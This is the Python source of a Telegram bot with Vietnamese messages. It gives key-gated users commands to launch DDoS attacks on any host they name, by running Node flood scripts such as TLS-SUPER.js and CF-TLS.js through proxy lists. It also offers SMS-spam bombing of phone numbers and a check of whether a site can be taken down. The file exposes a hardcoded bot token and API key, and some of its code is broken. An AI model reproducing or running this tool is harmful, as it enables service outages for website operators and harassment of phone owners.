import telebot
import datetime
import time
import os
import subprocess
import psutil
import sqlite3
import hashlib
import requests
import sys
import socket
import zipfile
import io
import re
import threading

bot_token = '6497995869:AAFQtMGvk_EUvC1FbaFtUxAEC7jG77Q4OUI'

bot = telebot.TeleBot(bot_token)

allowed_group_id = 4007752616

allowed_users = []
processes = []
ADMIN_ID = 6127439641
proxy_update_count = 0
last_proxy_update_time = time.time()
key_dict = {}

connection = sqlite3.connect('user_data.db')
cursor = connection.cursor()

# Create the users table if it doesn't exist
cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        expiration_time TEXT
    )
''')
connection.commit()
def TimeStamp():
    now = str(datetime.date.today())
    return now
def load_users_from_database():
    cursor.execute('SELECT user_id, expiration_time FROM users')
    rows = cursor.fetchall()
    for row in rows:
        user_id = row[0]
        expiration_time = datetime.datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S')
        if expiration_time > datetime.datetime.now():
            allowed_users.append(user_id)

def save_user_to_database(connection, user_id, expiration_time):
    cursor = connection.cursor()
    cursor.execute('''
        INSERT OR REPLACE INTO users (user_id, expiration_time)
        VALUES (?, ?)
    ''', (user_id, expiration_time.strftime('%Y-%m-%d %H:%M:%S')))
    connection.commit()
@bot.message_handler(commands=['add'])
def add_user(message):
    admin_id = message.from_user.id
    if admin_id != ADMIN_ID:
        bot.reply_to(message, 'Chi Dành Cho Admin')
        return

    if len(message.text.split()) == 1:
        bot.reply_to(message, 'Nhập Đúng Định Dạng /add + [id]')
        return

    user_id = int(message.text.split()[1])
    allowed_users.append(user_id)
    expiration_time = datetime.datetime.now() + datetime.timedelta(days=30)
    connection = sqlite3.connect('user_data.db')
    save_user_to_database(connection, user_id, expiration_time)
    connection.close()

    bot.reply_to(message, f'Đã Thêm Người Dùng Có ID Là: {user_id} Sử Dụng Lệnh 30 Ngày')


load_users_from_database()

@bot.message_handler(commands=['laykey'])
def laykey(message):
    bot.reply_to(message, text='Vui Lòng Chờ...')

    with open('key.txt', 'a') as f:
        f.close()

    username = message.from_user.username
    string = f'GL-{username}+{TimeStamp()}'
    hash_object = hashlib.md5(string.encode())
    key = str(hash_object.hexdigest())
    print(key)
    
    try:
        response = requests.get(f'https://link4m.co/api-shorten/v2?api=654f7fa559074560d17d5a0d&url=yourdestinationlink.com/?key={key}')
        response_json = response.json()
        if 'shortenedUrl' in response_json:
            url_key = response_json['shortenedUrl']
        else:
            url_key = "Lấy Key Lỗi Vui Lòng Sử Dụng Lại Lệnh /laykey"
    except requests.exceptions.RequestException as e:
        url_key = "FLấy Key Lỗi Vui Lòng Sử Dụng Lại Lệnh /laykey"
    
    text = f'''
- Cảm Ơn Bạn Đã laykey -
- Link Lấy Key Hôm Nay Là: {url_key}
- Nhập Key Bằng Lệnh /key + [key] -
 [Lưu ý: mỗi key chỉ có 1 người dùng]
    '''
    bot.reply_to(message, text)

@bot.message_handler(commands=['key'])
def key(message):
    if len(message.text.split()) == 1:
        bot.reply_to(message, 'Vui Lòng Nhập Key\nVí Dụ /key TRANDUCDUYCODER\nSử Dụng Lệnh /laykey Để Lấy Key')
        return

    user_id = message.from_user.id

    key = message.text.split()[1]
    username = message.from_user.username
    string = f'GL-{username}+{TimeStamp()}'
    hash_object = hashlib.md5(string.encode())
    expected_key = str(hash_object.hexdigest())
    if key == expected_key:
        allowed_users.append(user_id)
        bot.reply_to(message, 'Nhập Key Thành Công Sử Dụng Lệnh /menu Để Xem Các Lệnh')
    else:
        bot.reply_to(message, 'Key Sai Hoặc Hết Hạn\nKhông Sử Dụng Key Của Người Khác!')


@bot.message_handler(commands=['start', 'menu'])
def menu(message):
    menu_text = '''
┏━━━━━━━━━━━━━━┓
               --Menu Các Lệnh--
                  
┣➤  /laykey : Để lấy key
┣➤  /key + [Key] : Kích Hoạt Key
┣➤  /sms + [Số Điện Thoại] 
      -- Lệnh DDoS ( Tấn Công Website )--
┣➤ /attack + [methods] + [host]
┣➤  /methods : Để Xem Methods
┣➤  /check + [host] : Kiểm Tra AntiDDoS
┣➤  /proxy : Check Số Lượng Proxy
      -- Lệnh Có Ích --
┣➤  /code + [host] : Lấy Source Code Website
┣➤  /getproxy : Proxy Sẽ Tự Động Update Sau 10 Phút
[ Proxy Live 95% Die 5 % ]
┣➤  /time : Số Thời Gian Bot Hoạt Động
        -- Thông Tin Admin --
┣➤  /muakey : Để Mua Key VIP
┣➤ /admin : Info Admin
┣➤ /on : Bật Bot
┣➤ /off : Tắt Bot
┗━━━━━━━━━━━━━━➤
'''
    bot.reply_to(message, menu_text)
    
is_bot_active = True
@bot.message_handler(commands=['sms'])
def attack_command(message):
    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return
    
    if user_id not in allowed_users:
        bot.reply_to(message, text='Vui lòng nhập Key\nSử dụng lệnh /laykey để lấy Key')
        return

    if len(message.text.split()) < 2:
        bot.reply_to(message, 'Vui lòng nhập đúng cú pháp.\nVí dụ: /sms + [số điện thoại]')
        return

    username = message.from_user.username

    args = message.text.split()
    phone_number = args[1]

    blocked_numbers = ['113', '114', '115', '198', '911', '0393366620']
    if phone_number in blocked_numbers:
        bot.reply_to(message, 'Bạn không được spam số này.')
        return

    if user_id in cooldown_dict and time.time() - cooldown_dict[user_id] < 90:
        remaining_time = int(90 - (time.time() - cooldown_dict[user_id]))
        bot.reply_to(message, f'Vui lòng đợi {remaining_time} giây trước khi tiếp tục sử dụng lệnh này.')
        return
    
    cooldown_dict[user_id] = time.time()

    username = message.from_user.username

    bot.reply_to(message, f'@{username} Đang Tiến Hành Spam')

    args = message.text.split()
    phone_number = args[1]

    # Gửi dữ liệu tới api
    url = f"{link}&phone={phone_number}"
    response = requests.get(url)

    bot.reply_to(message, f'┏━━━━━━━━━━━━━━┓\n┃   Spam Thành Công!!!\n┗━━━━━━━━━━━━━━➤\n┏━━━━━━━━━━━━━━┓\n┣➤ Attack By: @{username} \n┣➤ Số Tấn Công: {phone_number} \n┣➤ Group: @spamsms205 \n┗━━━━━━━━━━━━━━➤')
@bot.message_handler(commands=['methods'])
def methods(message):
    menu_text = '''
📌 Tất Cả Methods:
🚀 Layer 7 
[ Attack Gov,Edu : No ]
CF-TLS
HTTP-LOAD
TLS-SUPER
[ Attack Gov,Edu : Yes ]
HTTP-MIX 
🚀 Layer 4
Was not found!!!
'''
    bot.reply_to(message, menu_text)

allowed_users = []  # Define your allowed users list
cooldown_dict = {}
is_bot_active = True

def run_attack(command, duration, message):
    cmd_process = subprocess.Popen(command)
    start_time = time.time()
    
    while cmd_process.poll() is None:
        # Check CPU usage and terminate if it's too high for 10 seconds
        if psutil.cpu_percent(interval=1) >= 1:
            time_passed = time.time() - start_time
            if time_passed >= 90:
                cmd_process.terminate()
                bot.reply_to(message, "Đã Dừng Lệnh Tấn Công, Cảm Ơn Bạn Đã Sử Dụng")
                return
        # Check if the attack duration has been reached
        if time.time() - start_time >= duration:
            cmd_process.terminate()
            cmd_process.wait()
            return

@bot.message_handler(commands=['attack'])
def attack_command(message):
    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return
    
    if user_id not in allowed_users:
        bot.reply_to(message, text='Vui lòng nhập Key\nSử dụng lệnh /laykey để lấy Key')
        return

    if len(message.text.split()) < 3:
        bot.reply_to(message, 'Vui lòng nhập đúng cú pháp.\nVí dụ: /attack + [method] + [host]')
        return

    username = message.from_user.username

    current_time = time.time()
    if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 120:
        remaining_time = int(120 - (current_time - cooldown_dict[username].get('attack', 0)))
        bot.reply_to(message, f"@{username} Vui lòng đợi {remaining_time} giây trước khi sử dụng lại lệnh /attack.")
        return
    
    args = message.text.split()
    method = args[1].upper()
    host = args[2]

    if method in ['UDP-FLOOD', 'TCP-FLOOD'] and len(args) < 4:
        bot.reply_to(message, f'Vui lòng nhập cả port.\nVí dụ: /attack {method} {host} [port]')
        return

    if method in ['UDP-FLOOD', 'TCP-FLOOD']:
        port = args[3]
    else:
        port = None

    blocked_domains = [".edu.vn", ".gov.vn", "chinhphu.vn"]   
    if method == 'TLS-SUPER' or method == 'HTTP-LOAD' or method == 'CF-TLS':
        for blocked_domain in blocked_domains:
            if blocked_domain in host:
                bot.reply_to(message, f"Không được phép tấn công trang web có tên miền {blocked_domain}")
                return

    if method in ['TLS-SUPER', 'HTTP-MIX', 'DESTROY', 'CF-TLS', 'HTTP-LOAD', 'TCP-FLOOD']:
        # Update the command and duration based on the selected method
        if method == 'TLS-SUPER':
            command = ["node", "TLS-SUPER.js", host, "5000", "60", "30"]
            duration = 90
        elif method == 'GOD':
            command = ["node", "GOD.js", host, "45", "64", "3"]
            duration = 45
        elif method == 'HTTP-LOAD':
            command = ["node", "HTTP-LOAD.js", host, "5000", "64", "50"]
            duration = 90
        elif method == 'CF-TLS':
            command = ["node", "CF-TLS.js", host, "90", "30", "proxy.txt"]
            duration = 90
            
        cooldown_dict[username] = {'attack': current_time}

        attack_thread = threading.Thread(target=run_attack, args=(command, duration, message))
        attack_thread.start()
        bot.reply_to(message, f'┏━━━━━━━━━━━━━━┓\n┃   Successful Attack!!!\n┗━━━━━━━━━━━━━━➤\n┏━━━━━━━━━━━━━━┓\n┣➤ Attack By: @{username} \n┣➤ Host: {host} \n┣➤ Methods: {method} \n┣➤ Time: {duration} Giây\n┣➤ Group: @smsconty123 \n┗━━━━━━━━━━━━━━➤')
    else:
        bot.reply_to(message, 'Phương thức tấn công không hợp lệ. Sử dụng lệnh /methods để xem phương thức tấn công')

@bot.message_handler(commands=['proxy'])
def proxy_command(message):
    user_id = message.from_user.id
    if user_id in allowed_users:
        try:
            with open("proxy.txt", "r") as proxy_file:
                proxies = proxy_file.readlines()
                num_proxies = len(proxies)
                bot.reply_to(message, f"Số lượng proxy: {num_proxies}")
        except FileNotFoundError:
            bot.reply_to(message, "Không tìm thấy file proxy.txt.")
    else:
        bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này.')

def send_proxy_update():
    while True:
        try:
            with open("proxy.txt", "r") as proxy_file:
                proxies = proxy_file.readlines()
                num_proxies = len(proxies)
                proxy_update_message = f"Số proxy mới update là: {num_proxies}"
                bot.send_message(allowed_group_id, proxy_update_message)
        except FileNotFoundError:
            pass
        time.sleep(3600)  # Wait for 10 minutes

@bot.message_handler(commands=['cpu'])
def check_cpu(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này.')
        return

    cpu_usage = psutil.cpu_percent(interval=1)
    memory_usage = psutil.virtual_memory().percent

    bot.reply_to(message, f'🖥️ CPU Usage: {cpu_usage}%\n💾 Memory Usage: {memory_usage}%')

@bot.message_handler(commands=['off'])
def turn_off(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này.')
        return

    global is_bot_active
    is_bot_active = False
    bot.reply_to(message, 'Bot đã được tắt. Tất cả người dùng không thể sử dụng lệnh khác.')

@bot.message_handler(commands=['on'])
def turn_on(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này.')
        return

    global is_bot_active
    is_bot_active = True
    bot.reply_to(message, 'Bot đã được khởi động lại. Tất cả người dùng có thể sử dụng lại lệnh bình thường.')

is_bot_active = True
@bot.message_handler(commands=['code'])
def code(message):
    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return
    
    if user_id not in allowed_users:
        bot.reply_to(message, text='Vui lòng nhập Key\nSử dụng lệnh /laykey để lấy Key')
        return
    if len(message.text.split()) != 2:
        bot.reply_to(message, 'Vui lòng nhập đúng cú pháp.\nVí dụ: /code + [link website]')
        return

    url = message.text.split()[1]

    try:
        response = requests.get(url)
        if response.status_code != 200:
            bot.reply_to(message, 'Không thể lấy mã nguồn từ trang web này. Vui lòng kiểm tra lại URL.')
            return

        content_type = response.headers.get('content-type', '').split(';')[0]
        if content_type not in ['text/html', 'application/x-php', 'text/plain']:
            bot.reply_to(message, 'Trang web không phải là HTML hoặc PHP. Vui lòng thử với URL trang web chứa file HTML hoặc PHP.')
            return

        source_code = response.text

        zip_file = io.BytesIO()
        with zipfile.ZipFile(zip_file, 'w') as zipf:
            zipf.writestr("source_code.txt", source_code)

        zip_file.seek(0)
        bot.send_chat_action(message.chat.id, 'upload_document')
        bot.send_document(message.chat.id, zip_file)

    except Exception as e:
        bot.reply_to(message, f'Có lỗi xảy ra: {str(e)}')

@bot.message_handler(commands=['check'])
def check_ip(message):
    if len(message.text.split()) != 2:
        bot.reply_to(message, 'Vui lòng nhập đúng cú pháp.\nVí dụ: /check + [link website]')
        return

    url = message.text.split()[1]
    
    # Kiểm tra xem URL có http/https chưa, nếu chưa thêm vào
    if not url.startswith(("http://", "https://")):
        url = "http://" + url

    # Loại bỏ tiền tố "www" nếu có
    url = re.sub(r'^(http://|https://)?(www\d?\.)?', '', url)
    
    try:
        ip_list = socket.gethostbyname_ex(url)[2]
        ip_count = len(ip_list)

        reply = f"Ip của website: {url}\nLà: {', '.join(ip_list)}\n"
        if ip_count == 1:
            reply += "Website có 1 ip có khả năng không antiddos."
        else:
            reply += "Website có nhiều hơn 1 ip khả năng antiddos rất cao.\nKhông thể tấn công website này."

        bot.reply_to(message, reply)
    except Exception as e:
        bot.reply_to(message, f"Có lỗi xảy ra: {str(e)}")

@bot.message_handler(commands=['admin'])
def send_admin_link(message):
    bot.reply_to(message, "Telegram: https://t.me/stuff2220")
@bot.message_handler(commands=['sms'])
def sms(message):
    pass


# Hàm tính thời gian hoạt động của bot
start_time = time.time()

proxy_update_count = 0
proxy_update_interval = 600 

@bot.message_handler(commands=['getproxy'])
def get_proxy_info(message):
    user_id = message.from_user.id
    global proxy_update_count

    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return
    
    if user_id not in allowed_users:
        bot.reply_to(message, text='Vui lòng nhập Key\nSử dụng lệnh /laykey để lấy Key')
        return

    try:
        with open("proxybynhakhoahoc.txt", "r") as proxy_file:
            proxy_list = proxy_file.readlines()
            proxy_list = [proxy.strip() for proxy in proxy_list]
            proxy_count = len(proxy_list)
            proxy_message = f'10 Phút Tự Update\nSố lượng proxy: {proxy_count}\n'
            bot.send_message(message.chat.id, proxy_message)
            bot.send_document(message.chat.id, open("proxybynhakhoahoc.txt", "rb"))
            proxy_update_count += 1
    except FileNotFoundError:
        bot.reply_to(message, "Không tìm thấy file proxy.txt.")


@bot.message_handler(commands=['time'])
def show_uptime(message):
    current_time = time.time()
    uptime = current_time - start_time
    hours = int(uptime // 3600)
    minutes = int((uptime % 3600) // 60)
    seconds = int(uptime % 60)
    uptime_str = f'{hours} giờ, {minutes} phút, {seconds} giây'
    bot.reply_to(message, f'Bot Đã Hoạt Động Được: {uptime_str}')


@bot.message_handler(func=lambda message: message.text.startswith('/'))
def invalid_command(message):
    bot.reply_to(message, 'Lệnh không hợp lệ. Vui lòng sử dụng lệnh /menu để xem danh sách lệnh.')

bot.infinity_polling(timeout=60, long_polling_timeout = 1)
